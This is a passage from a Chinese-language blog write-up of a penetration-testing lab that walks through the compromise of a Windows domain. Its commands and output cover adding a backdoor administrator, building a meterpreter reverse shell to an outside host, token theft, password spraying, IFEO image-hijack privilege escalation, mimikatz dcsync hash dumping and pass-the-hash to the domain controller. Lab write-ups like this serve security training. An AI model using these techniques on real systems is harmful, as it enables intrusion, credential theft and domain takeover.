</span></span><span class="line"><span class="ln">60</span><span class="cl">[2025-03-09 19:54:29] [INFO] å­˜æ´»ç«¯å£æ•°é‡: 17
</span></span><span class="line"><span class="ln">61</span><span class="cl">[2025-03-09 19:54:30] [INFO] å¼€å§‹æ¼æ´æ‰«æ
</span></span><span class="line"><span class="ln">62</span><span class="cl">[2025-03-09 19:54:30] [INFO] åŠ è½½çš„æ’ä»¶: findnet, ldap, ms17010, mssql, netbios, smb, smb2, smbghost, webpoc, webtitle
</span></span><span class="line"><span class="ln">63</span><span class="cl">[2025-03-09 19:54:30] [SUCCESS] NetInfo æ‰«æç»“æœ
</span></span><span class="line"><span class="ln">64</span><span class="cl">ç›®æ ‡ä¸»æœº: 172.22.8.18
</span></span><span class="line"><span class="ln">65</span><span class="cl">ä¸»æœºå: WIN-WEB
</span></span><span class="line"><span class="ln">66</span><span class="cl">å‘ç°çš„ç½‘ç»œæ¥å£:
</span></span><span class="line"><span class="ln">67</span><span class="cl">   IPv4åœ°å€:
</span></span><span class="line"><span class="ln">68</span><span class="cl">      â””â”€ 172.22.8.18
</span></span><span class="line"><span class="ln">69</span><span class="cl">   IPv6åœ°å€:
</span></span><span class="line"><span class="ln">70</span><span class="cl">      â””â”€ 2001:0:348b:fb58:1445:3719:d89d:8092
</span></span><span class="line"><span class="ln">71</span><span class="cl">[2025-03-09 19:54:30] [SUCCESS] NetBios 172.22.8.31     XIAORANG\WIN19-CLIENT         
</span></span><span class="line"><span class="ln">72</span><span class="cl">[2025-03-09 19:54:30] [SUCCESS] NetInfo æ‰«æç»“æœ
</span></span><span class="line"><span class="ln">73</span><span class="cl">ç›®æ ‡ä¸»æœº: 172.22.8.15
</span></span><span class="line"><span class="ln">74</span><span class="cl">ä¸»æœºå: DC01
</span></span><span class="line"><span class="ln">75</span><span class="cl">å‘ç°çš„ç½‘ç»œæ¥å£:
</span></span><span class="line"><span class="ln">76</span><span class="cl">   IPv4åœ°å€:
</span></span><span class="line"><span class="ln">77</span><span class="cl">      â””â”€ 172.22.8.15
</span></span><span class="line"><span class="ln">78</span><span class="cl">[2025-03-09 19:54:30] [SUCCESS] NetInfo æ‰«æç»“æœ
</span></span><span class="line"><span class="ln">79</span><span class="cl">ç›®æ ‡ä¸»æœº: 172.22.8.46
</span></span><span class="line"><span class="ln">80</span><span class="cl">ä¸»æœºå: WIN2016
</span></span><span class="line"><span class="ln">81</span><span class="cl">å‘ç°çš„ç½‘ç»œæ¥å£:
</span></span><span class="line"><span class="ln">82</span><span class="cl">   IPv4åœ°å€:
</span></span><span class="line"><span class="ln">83</span><span class="cl">      â””â”€ 172.22.8.46
</span></span><span class="line"><span class="ln">84</span><span class="cl">[2025-03-09 19:54:30] [SUCCESS] NetInfo æ‰«æç»“æœ
</span></span><span class="line"><span class="ln">85</span><span class="cl">ç›®æ ‡ä¸»æœº: 172.22.8.31
</span></span><span class="line"><span class="ln">86</span><span class="cl">ä¸»æœºå: WIN19-CLIENT
</span></span><span class="line"><span class="ln">87</span><span class="cl">å‘ç°çš„ç½‘ç»œæ¥å£:
</span></span><span class="line"><span class="ln">88</span><span class="cl">   IPv4åœ°å€:
</span></span><span class="line"><span class="ln">89</span><span class="cl">      â””â”€ 172.22.8.31
</span></span><span class="line"><span class="ln">90</span><span class="cl">[2025-03-09 19:54:30] [SUCCESS] NetBios 172.22.8.46     WIN2016.xiaorang.lab                Windows Server 2016 Datacenter 14393
</span></span><span class="line"><span class="ln">91</span><span class="cl">[2025-03-09 19:54:30] [SUCCESS] NetBios 172.22.8.15     DC:XIAORANG\DC01           
</span></span><span class="line"><span class="ln">92</span><span class="cl">[2025-03-09 19:54:30] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://172.22.8.46        çŠ¶æ€ç :200 é•¿åº¦:703    æ ‡é¢˜:IIS Windows Server
</span></span><span class="line"><span class="ln">93</span><span class="cl">[2025-03-09 19:54:30] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://172.22.8.18        çŠ¶æ€ç :200 é•¿åº¦:703    æ ‡é¢˜:IIS Windows Server
</span></span><span class="line"><span class="ln">94</span><span class="cl">[2025-03-09 19:54:31] [SUCCESS] MSSQL 172.22.8.18:1433 sa 1qaz!QAZ
</span></span><span class="line"><span class="ln">95</span><span class="cl">[2025-03-09 19:54:53] [SUCCESS] æ‰«æå·²å®Œæˆ: 32/32
</span></span></code></pre></div><p>æ‰«åˆ°ä¸‰å°æœºå­</p>
<pre tabindex="0"><code>NetBios 172.22.8.46  WIN2016.xiaorang.lab 
NetBios 172.22.8.31  XIAORANG\WIN19-CLIENT
NetBios 172.22.8.15  DC:XIAORANG\DC01
</code></pre><p>æ²¡æœ‰ä»€ä¹ˆèƒ½ç›´æ¥åˆ©ç”¨çš„æœåŠ¡</p>
<p>é‚£æˆ‘ä»¬æ¥ç€ä¿¡æ¯æ”¶é›†ä¸€ä¸‹</p>
<pre tabindex="0"><code>net user
</code></pre><pre tabindex="0"><code>ä¸»æœºå:           WIN-WEB
OS åç§°:          Microsoft Windows Server 2016 Datacenter
OS ç‰ˆæœ¬:          10.0.14393 æš‚ç¼º Build 14393
OS åˆ¶é€ å•†:        Microsoft Corporation
OS é…ç½®:          ç‹¬ç«‹æœåŠ¡å™¨
OS æ„ä»¶ç±»å‹:      Multiprocessor Free
æ³¨å†Œçš„æ‰€æœ‰äºº:
æ³¨å†Œçš„ç»„ç»‡:       Aliyun
äº§å“ ID:          00376-40000-00000-AA947
åˆå§‹å®‰è£…æ—¥æœŸ:     2022/7/11, 12:46:14
ç³»ç»Ÿå¯åŠ¨æ—¶é—´:     2025/3/9, 18:28:29
ç³»ç»Ÿåˆ¶é€ å•†:       Alibaba Cloud
ç³»ç»Ÿå‹å·:         Alibaba Cloud ECS
ç³»ç»Ÿç±»å‹:         x64-based PC
å¤„ç†å™¨:           å®‰è£…äº† 1 ä¸ªå¤„ç†å™¨ã€‚
                  [01]: Intel64 Family 6 Model 85 Stepping 7 GenuineIntel ~2500 Mhz
BIOS ç‰ˆæœ¬:        SeaBIOS 449e491, 2014/4/1
Windows ç›®å½•:     C:\Windows
ç³»ç»Ÿç›®å½•:         C:\Windows\system32
å¯åŠ¨è®¾å¤‡:         \Device\HarddiskVolume1
ç³»ç»ŸåŒºåŸŸè®¾ç½®:     zh-cn;ä¸­æ–‡(ä¸­å›½)
è¾“å…¥æ³•åŒºåŸŸè®¾ç½®:   zh-cn;ä¸­æ–‡(ä¸­å›½)
æ—¶åŒº:             (UTC+08:00) åŒ—äº¬ï¼Œé‡åº†ï¼Œé¦™æ¸¯ç‰¹åˆ«è¡Œæ”¿åŒºï¼Œä¹Œé²æœ¨é½
ç‰©ç†å†…å­˜æ€»é‡:     3,950 MB
å¯ç”¨çš„ç‰©ç†å†…å­˜:   883 MB
è™šæ‹Ÿå†…å­˜: æœ€å¤§å€¼: 5,848 MB
è™šæ‹Ÿå†…å­˜: å¯ç”¨:   1,169 MB
è™šæ‹Ÿå†…å­˜: ä½¿ç”¨ä¸­: 4,679 MB
é¡µé¢æ–‡ä»¶ä½ç½®:     C:\pagefile.sys
åŸŸ:               WORKGROUP
ç™»å½•æœåŠ¡å™¨:       æš‚ç¼º
ä¿®è¡¥ç¨‹åº:         å®‰è£…äº† 6 ä¸ªä¿®è¡¥ç¨‹åºã€‚
                  [01]: KB5013625
                  [02]: KB4049065
                  [03]: KB4486129
                  [04]: KB4486131
                  [05]: KB5014026
                  [06]: KB5013952
ç½‘å¡:             å®‰è£…äº† 1 ä¸ª NICã€‚
                  [01]: Red Hat VirtIO Ethernet Adapter
                      è¿æ¥å:      ä»¥å¤ªç½‘
                      å¯ç”¨ DHCP:   æ˜¯
                      DHCP æœåŠ¡å™¨: 172.22.255.253
                      IP åœ°å€
                        [01]: 172.22.8.18
                        [02]: fe80::205a:dd47:2165:6397
Hyper-V è¦æ±‚:     å·²æ£€æµ‹åˆ°è™šæ‹Ÿæœºç›‘æ§ç¨‹åºã€‚å°†ä¸æ˜¾ç¤º Hyper-V æ‰€éœ€çš„åŠŸèƒ½ã€‚
</code></pre><pre tabindex="0"><code>C:\Tmp&gt;net user

\\ çš„ç”¨æˆ·å¸æˆ·

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest
John                     test
å‘½ä»¤è¿è¡Œå®Œæ¯•ï¼Œä½†å‘ç”Ÿä¸€ä¸ªæˆ–å¤šä¸ªé”™è¯¯ã€‚
</code></pre><pre tabindex="0"><code>C:\Tmp&gt;quser
 ç”¨æˆ·å                ä¼šè¯å             ID  çŠ¶æ€    ç©ºé—²æ—¶é—´   ç™»å½•æ—¶é—´
 john                  rdp-tcp#0           2  è¿è¡Œä¸­       2:38  2025/3/9 18:30
</code></pre><p>å‘ç°ä¸€ä¸ªjohnç”¨æˆ·è¿œç¨‹è¿æ¥æœ¬å°æœºå­</p>
<p>ä¸ºäº†æ–¹ä¾¿å¯ä»¥æ–°å»ºä¸€ä¸ªç”¨æˆ·rdpè¿ä¸Šå»</p>
<pre tabindex="0"><code>C:\Tmp&gt;net user xrntkk Abc20060201 /add
å‘½ä»¤æˆåŠŸå®Œæˆã€‚

C:\Tmp&gt;net localgroup administrators xrntkk /add
å‘½ä»¤æˆåŠŸå®Œæˆã€‚

C:\Tmp&gt;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&#34; &#34;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
æ“ä½œæˆåŠŸå®Œæˆã€‚
</code></pre><p><img alt="image-20250309212215376" loading="lazy" src="../assets/image-20250309212215376.png"></p>
<p>ç®¡ç†å‘˜æƒé™å¯ä»¥å·RDPç”¨æˆ·çš„tokenï¼Œä»è€ŒæŸ¥çœ‹å…¶æŒ‚è½½çš„ç›˜ã€‚</p>
<p>è¿™é‡Œå¯ä»¥ç”¨msfçš„incognitoæ¨¡å—</p>
<pre tabindex="0"><code>ubuntu@VM-20-9-ubuntu:~$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=106.55.168.231  LPORT=9999 -f exe -o msf.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: msf.exe
</code></pre><p>å…ˆç”¨msfä¸Šä¸ªçº¿</p>
<pre tabindex="0"><code>msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost 106.55.168.231
set lport 9999
exploit
</code></pre><p><img alt="image-20250309215543675" loading="lazy" src="../assets/image-20250309215543675.png"></p>
<p>ä¸Šçº¿</p>
<p>æ¥ç€ç”¨incognitoæ¨¡å—å·Johnçš„token</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="ln"> 1</span><span class="cl">meterpreter <span class="p">&gt;</span> use incognito
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">Loading extension incognito...Success.
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">meterpreter <span class="p">&gt;</span> list_tokens -u
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">Delegation Tokens Available
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">========================================
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">IIS APPPOOL\DefaultAppPool
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">NT AUTHORITY\LOCAL SERVICE
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">NT AUTHORITY\NETWORK SERVICE
</span></span><span class="line"><span class="ln">10</span><span class="cl">NT AUTHORITY\SYSTEM
</span></span><span class="line"><span class="ln">11</span><span class="cl">NT SERVICE\MsDtsServer130
</span></span><span class="line"><span class="ln">12</span><span class="cl">NT SERVICE\MSSQLFDLauncher
</span></span><span class="line"><span class="ln">13</span><span class="cl">NT SERVICE\MSSQLSERVER
</span></span><span class="line"><span class="ln">14</span><span class="cl">NT SERVICE\MSSQLServerOLAPService
</span></span><span class="line"><span class="ln">15</span><span class="cl">NT SERVICE\ReportServer
</span></span><span class="line"><span class="ln">16</span><span class="cl">NT SERVICE\SQLTELEMETRY
</span></span><span class="line"><span class="ln">17</span><span class="cl">NT SERVICE\SSASTELEMETRY
</span></span><span class="line"><span class="ln">18</span><span class="cl">NT SERVICE\SSISTELEMETRY130
</span></span><span class="line"><span class="ln">19</span><span class="cl">WIN-WEB\John
</span></span><span class="line"><span class="ln">20</span><span class="cl">WIN-WEB\test
</span></span><span class="line"><span class="ln">21</span><span class="cl">WIN-WEB\xrntkk
</span></span><span class="line"><span class="ln">22</span><span class="cl">Window Manager\DWM-1
</span></span><span class="line"><span class="ln">23</span><span class="cl">Window Manager\DWM-2
</span></span><span class="line"><span class="ln">24</span><span class="cl">Window Manager\DWM-3
</span></span><span class="line"><span class="ln">25</span><span class="cl">Window Manager\DWM-4
</span></span><span class="line"><span class="ln">26</span><span class="cl">
</span></span><span class="line"><span class="ln">27</span><span class="cl">Impersonation Tokens Available
</span></span><span class="line"><span class="ln">28</span><span class="cl">========================================
</span></span><span class="line"><span class="ln">29</span><span class="cl">No tokens available
</span></span></code></pre></div><p>å¯ä»¥çœ‹åˆ°å·²ç»æ‹¿åˆ°Johnçš„tokenäº†</p>
<p>ä»¥Johnçš„èº«ä»½è¿è¡Œcmd</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="ln"> 1</span><span class="cl">meterpreter <span class="p">&gt;</span> impersonate_token WIN-WEB\\John
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">[+] Delegation token available
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">[+] Successfully impersonated user WIN-WEB\John
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">meterpreter <span class="p">&gt;</span> shell
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">Process 7508 created.
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">Channel 1 created.
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">...
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">C<span class="p">:</span><span class="nl">\Tmp</span><span class="c1">&gt;whoami</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">whoami
</span></span><span class="line"><span class="ln">11</span><span class="cl">win-web\john
</span></span></code></pre></div><pre tabindex="0"><code>net use
</code></pre><p><img alt="image-20250309220249284" loading="lazy" src="../assets/image-20250309220249284.png"></p>
<p>çœ‹ä¸€ä¸‹æŒ‚è½½æƒ…å†µï¼ˆä¸çŸ¥é“ä¸ºå•¥æˆ‘è¿™ä¹±ç äº†ï¼‰</p>
<p>æŒ‚è½½äº†cç›˜</p>
<p>æŸ¥çœ‹cç›˜ä¸­çš„credential.txtæ–‡ä»¶</p>
<pre tabindex="0"><code>C:\Tmp&gt;type \\TSCLIENT\C\credential.txt
type \\TSCLIENT\C\credential.txt
xiaorang.lab\Aldrich:Ald@rLMWuy7Z!#

Do you know how to hijack Image?
</code></pre><p>è¿™é‡Œæœ‰ä¸€ä¸²è´¦å·å¯†ç ï¼Œç”¨è¿™ä¸²è´¦å·å¯†ç è¿›è¡Œä¸€ä¸ªå¯†ç å–·æ´’</p>
<pre tabindex="0"><code>crackmapexec -q smb 172.22.8.0/24 -u Aldrich -p Ald@rLMWuy7Z!#
</code></pre><pre tabindex="0"><code>â”Œâ”€â”€(rootã‰¿Xrntkk-Laptop)-[/home/xrntkk]
â””â”€# proxychains4 -q crackmapexec smb 172.22.8.0/24 -u Aldrich -p Ald@rLMWuy7Zproxychains4 crackmapexec smb 172.22.8.0/24
 -u Aldrich -p Ald@rLMWuy7Z
SMB         172.22.8.18     445    WIN-WEB          [*] Windows Server 2016 Datacenter 14393 x64 (name:WIN-WEB) (domain:WIN-WEB) (signing:False) (SMBv1:True)
SMB         172.22.8.46     445    WIN2016          [*] Windows Server 2016 Datacenter 14393 x64 (name:WIN2016) (domain:xiaorang.lab) (signing:False) (SMBv1:True)
SMB         172.22.8.31     445    WIN19-CLIENT     [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN19-CLIENT) (domain:xiaorang.lab) (signing:False) (SMBv1:False)
SMB         172.22.8.46     445    WIN2016          [-] xiaorang.lab\Aldrich:Ald@rLMWuy7Z STATUS_LOGON_FAILURE
SMB         172.22.8.15     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:xiaorang.lab) (signing:True) (SMBv1:False)
SMB         172.22.8.18     445    WIN-WEB          [-] WIN-WEB\Aldrich:Ald@rLMWuy7Z STATUS_LOGON_FAILURE
SMB         172.22.8.31     445    WIN19-CLIENT     [-] xiaorang.lab\Aldrich:Ald@rLMWuy7Z STATUS_LOGON_FAILURE
SMB         172.22.8.15     445    DC01             [-] xiaorang.lab\Aldrich:Ald@rLMWuy7Z STATUS_LOGON_FAILURE
</code></pre><p>å¯ä»¥çœ‹åˆ°è¿™ä¸‰å°æœºè²Œä¼¼éƒ½èƒ½ç™»ä¸Šå»</p>
<pre tabindex="0"><code>SMB         172.22.8.46     445    WIN2016          [*] Windows Server 2016 Datacenter 14393 x64 (name:WIN2016) (domain:xiaorang.lab) (signing:False) (SMBv1:True)
SMB         172.22.8.31     445    WIN19-CLIENT     [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN19-CLIENT) (domain:xiaorang.lab) (signing:False) (SMBv1:False)
SMB         172.22.8.15     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:xiaorang.lab) (signing:True) (SMBv1:False)
</code></pre><p>æˆ‘è¿™é‡Œé€‰æ‹©ç™»31</p>
<pre tabindex="0"><code>proxychains4 rdesktop 172.22.8.31 -u Aldrich -d xiaorang.lab -p &#39;Ald@rLMWuy7Z!#&#39;
</code></pre><p>è¿™é‡Œè¦ç”¨rdesktopç™»ï¼Œrdpç™»ä¸ä¸Š</p>
<p>ä¼šæç¤ºå¯†ç è¿‡æœŸï¼Œæ”¹ä¸ªå¯†ç å°±è¡Œäº†</p>
<p><img alt="image-20250309223025272" loading="lazy" src="../assets/image-20250309223025272.png"></p>
<pre tabindex="0"><code></code></pre><p>ä½†æ˜¯æ”¹å®Œå¯†ç è¿™å°æœºè¿˜æ˜¯ç™»ä¸ä¸Šï¼Œæ²¡æœ‰ç™»é™†æƒé™</p>
<p>æ‰€ä»¥æˆ‘ä»¬å°è¯•ç”¨è¿™ä¸ªä¿®æ”¹åçš„è´¦å·å¯†ç å†å»ç™»è¿™ä¸ªè´¦å·çš„å¦ä¸€å°æœºå­</p>
<p>æˆåŠŸåœ¨46ä¸­ç™»å…¥ï¼Œåé¢è¿˜æ˜¯ç”¨rdpå§ï¼Œrdesktopä¹Ÿå¤ªå¡äº†</p>
<pre tabindex="0"><code>xiaorang.lab\Aldrich
Abc123456
</code></pre><h3 id="flag2">FLAG2<a hidden class="anchor" aria-hidden="true" href="#flag2">#</a></h3>
<p>ä¿¡æ¯æ”¶é›†ä¸€ä¸‹</p>
<p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬å·²ç»æ‹¿ä¸‹åŸŸå†…çš„ä¸€å°æœºå­äº†</p>
<pre tabindex="0"><code>systeminfo
</code></pre><p><img alt="image-20250309235305060" loading="lazy" src="../assets/image-20250309235305060.png"></p>
<p>æ¥ç€æˆ‘ä»¬ç”¨bloodhoundæ¥è¿›è¡Œä¸€ä¸‹åŸŸå†…ä¿¡æ¯æ”¶é›†</p>
<pre tabindex="0"><code>SharpHound.exe -c all
</code></pre><p><img alt="image-20250312194209589" loading="lazy" src="../assets/image-20250312194209589.png"></p>
<p>å°†æ•°æ®é‡‡é›†å®Œç”Ÿæˆçš„zipæ–‡ä»¶ï¼Œä¸Šä¼ å¯¼å…¥åˆ°BloodHoundåˆ†æ</p>
<p><img alt="undefined" loading="lazy" src="../assets/undefined.png"></p>
<p>ä»å›¾ä¸­ï¼Œæˆ‘ä»¬ä¼šå‘ç°46è¿™å°æœºå­çš„ç”¨æˆ·æ˜¯åŸŸç®¡ï¼Œé‚£æˆ‘ä»¬æ¥ä¸‹æ¥å°±è¦æƒ³åŠæ³•åœ¨è¿™å°æœºå­ä¸Šææƒï¼Œç„¶åæ‹¿ä¸‹åŸŸæ§</p>
<p>æ ¹æ®å‰é¢çš„hint</p>
<pre tabindex="0"><code>Do you know how to hijack Image?
</code></pre><p>æˆ‘ä»¬å¯ä»¥çŸ¥é“æ¥ä¸‹æ¥è¦è¿›è¡Œé•œåƒåŠ«æŒ(IFEO)ææƒ</p>
<pre tabindex="0"><code>Get-ACL -Path &#34;HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options&#34; | fl
</code></pre><p>è¿™æ¡å‘½ä»¤çš„æ„æ€æ˜¯è·å–æŒ‡å®šæ³¨å†Œè¡¨è·¯å¾„çš„è®¿é—®æ§åˆ¶åˆ—è¡¨ï¼ˆACLï¼‰ã€‚</p>
<p><img alt="image-20250312203230115" loading="lazy" src="../assets/image-20250312203230115.png"></p>
<pre tabindex="0"><code>NT AUTHORITY\Authenticated Users
</code></pre><p>æˆ‘ä»¬å¯ä»¥å‘ç°å…¨éƒ¨å·²ç™»å½•ç”¨æˆ·éƒ½å¯ä»¥å¯¹æ³¨å†Œè¡¨è¿›è¡Œä¿®æ”¹</p>
<p>é‚£æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ä¿®æ”¹æ³¨å†Œè¡¨è¿›è¡Œæ˜ åƒåŠ«æŒ</p>
<p>æˆ‘ä»¬è¿™é‡Œé€šè¿‡å°†æ”¾å¤§é•œå¯åŠ¨çš„magnify.exeæ›¿æ¢æˆC:\windows\system32\cmd.exeï¼Œæ¥è¿›è¡Œææƒ</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="ln">1</span><span class="cl">REG ADD <span class="s2">&#34;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe&#34;</span> /v Debugger /t REG_SZ /d <span class="s2">&#34;C:\windows\system32\cmd.exe&#34;</span>
</span></span></code></pre></div><p>ä¿®æ”¹åé€‰æ‹©é”å®š</p>
<p><img alt="image-20250312204030378" loading="lazy" src="../assets/image-20250312204030378.png"></p>
<p>åœ¨é”å®šé¡µé¢é€‰æ‹©æ”¾å¤§é•œå³å¯</p>
<p><img alt="image-20250312204318481" loading="lazy" src="../assets/image-20250312204318481-1741783399075-2.png"></p>
<pre tabindex="0"><code>type c:\Users\Administrator\flag\flag02.txt
</code></pre><p><img alt="image-20250312204643818" loading="lazy" src="../assets/image-20250312204643818.png"></p>
<p>æ¥ç€æˆ‘ä»¬å¯ä»¥æ–°å»ºä¸€ä¸ªç”¨æˆ·è®©rdpå¯ä»¥è¿ä¸Šå»</p>
<h3 id="flag3">FLAG3<a hidden class="anchor" aria-hidden="true" href="#flag3">#</a></h3>
<p>æ¥ä¸‹æ¥å°±æ˜¯å¸¸è§„çš„å°†åŸŸå†…ç”¨æˆ·çš„å“ˆå¸Œdumpä¸‹æ¥</p>
<pre tabindex="0"><code>mimikatz.exe &#34;lsadump::dcsync /domain:xiaorang.lab /all /csv&#34; exit &gt; mimikatz.txt
</code></pre><p>ç»“æœ</p>
<pre tabindex="0"><code>
  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  &#34;A La Vie, A L&#39;Amour&#34; - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz
 &#39;## v ##&#39;       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  &#39;#####&#39;        &gt; https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # lsadump::dcsync /domain:xiaorang.lab /all /csv
[DC] &#39;xiaorang.lab&#39; will be the domain
[DC] &#39;DC01.xiaorang.lab&#39; will be the DC server
[DC] Exporting domain &#39;xiaorang.lab&#39;
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)
502	krbtgt	3ffd5b58b4a6328659a606c3ea6f9b63	514
1000	DC01$	7408967f1fd3c2ff807232b7b5c5fc95	532480
500	Administrator	2c9d81bdcf3ec8b1def10328a7cc2f08	512
1103	WIN2016$	aae3dca76f254c52708ee076935bb533	16781312
1104	WIN19-CLIENT$	7c011200ecbe666945e465c200afcb5e	16781312
1105	Aldrich	0607f770c2f37e09a850e09e920a9f45	512

mimikatz(commandline) # exit
Bye!
</code></pre><p>ä¹‹åå°±å¯ä»¥è¿›è¡Œæ¨ªå‘ç§»åŠ¨äº†</p>
<pre tabindex="0"><code>proxychains4 impacket-smbexec -hashes :2c9d81bdcf3ec8b1def10328a7cc2f08 xiaorang.lab/administrator@172.22.8.15 -codec gbk
</code></pre><p><img alt="image-20250312214445451" loading="lazy" src="../assets/image-20250312214445451.png"></p>
<pre tabindex="0"><code>type c:\users\administrator\flag\flag03.txt
</code></pre><p>æ‹¿åˆ°æœ€åä¸€ä¸ªflag</p>
<pre tabindex="0"><code>C:\Windows\system32&gt;type c:\users\administrator\flag\flag03.txt
 _________               __    _                  _
|  _   _  |             [  |  (_)                / |_
|_/ | | \_|.--.   .---.  | |  __  .---.  _ .--. `| |-&#39;
    | |   ( (`\] / /&#39;`\] | | [  |/ /__\\[ `.-. | | |
   _| |_   `&#39;.&#39;. | \__.  | |  | || \__., | | | | | |,
  |_____| [\__) )&#39;.___.&#39;[___][___]&#39;.__.&#39;[___||__]\__/


Congratulations! ! !

flag03: flag{410202d3-2e47-4619-a6b0-96051a985f2e}
</code></pre><p>è¿™é¢˜ç”¨csæ‰“ä¼šæ–¹ä¾¿å¾ˆå¤šï¼Œä½†æ˜¯ä¸€å¼€å§‹æ²¡è€ƒè™‘åˆ°ï¼Œæ‰€ä»¥åé¢ä¹Ÿä¸€ç›´æ²¡ç”¨ã€‚</p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="http://localhost:1313/tags/writeup/">Writeup</a></li>
      <li><a href="http://localhost:1313/tags/%E6%B8%97%E9%80%8F/">æ¸—é€</a></li>
      <li><a href="http://localhost:1313/tags/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/">æ˜¥ç§‹äº‘é•œ</a></li>
    </ul>
<nav class="paginav">
  <a class="prev" href="http://localhost:1313/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial-writeup/">
    <span class="title">Â« ä¸Šä¸€é¡µ</span>
    <br>
    <span>æ˜¥ç§‹äº‘é•œ-Initial-Writeup</span>
  </a>
  <a class="next" href="http://localhost:1313/post/ghctf_2025/">
    <span class="title">ä¸‹ä¸€é¡µ Â»</span>
    <br>
    <span>GHCTF-2025-Web-Writeup</span>
  </a>
</nav>

  </footer><div id="tw-comment"></div>
<script>
    
    const getStoredTheme = () => localStorage.getItem("pref-theme") === "light" ? "light" : "dark";
    const setGiscusTheme = () => {
        const sendMessage = (message) => {
            const iframe = document.querySelector('iframe.giscus-frame');
            if (iframe) {
                iframe.contentWindow.postMessage({giscus: message}, 'https://giscus.app');
            }
        }
        sendMessage({setConfig: {theme: getStoredTheme()}})
    }

    document.addEventListener("DOMContentLoaded", () => {
        const giscusAttributes = {
            "src": "https://giscus.app/client.js",
            "data-repo": "sonnycalcr\/sonnycalcr.github.io",
            "data-repo-id": "xxxxxx",
            "data-category": "Announcements",
            "data-category-id": "xxxxx",
            "data-mapping": "pathname",
            "data-strict": "0",
            "data-reactions-enabled": "1",
            "data-emit-metadata": "0",
            "data-input-position": "bottom",
            "data-theme": getStoredTheme(),
            "data-lang": "zh-CN",
            "data-loading": "lazy",
            "crossorigin": "anonymous",
        };

        
        const giscusScript = document.createElement("script");
        Object.entries(giscusAttributes).forEach(
                ([key, value]) => giscusScript.setAttribute(key, value));
        document.querySelector("#tw-comment").appendChild(giscusScript);

        
        const themeSwitcher = document.querySelector("#theme-toggle");
        if (themeSwitcher) {
            themeSwitcher.addEventListener("click", setGiscusTheme);
        }
        const themeFloatSwitcher = document.querySelector("#theme-toggle-float");
        if (themeFloatSwitcher) {
            themeFloatSwitcher.addEventListener("click", setGiscusTheme);
        }
    });
</script>
</article>
    </main>
    
<footer class="footer">
        <span><a href="https://blog.xrntkk.top/">Â©2024 Xrntkk&rsquo;s Blog</a></span> Â· 


    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
    <div class="busuanzi-footer">
    <span id="busuanzi_container_site_pv">
        Total Visits: <span id="busuanzi_value_site_pv"></span> & 
    </span>
    <span id="busuanzi_container_site_uv">
        Unique Visitor: <span id="busuanzi_value_site_uv"></span>
    </span>
    </div></footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
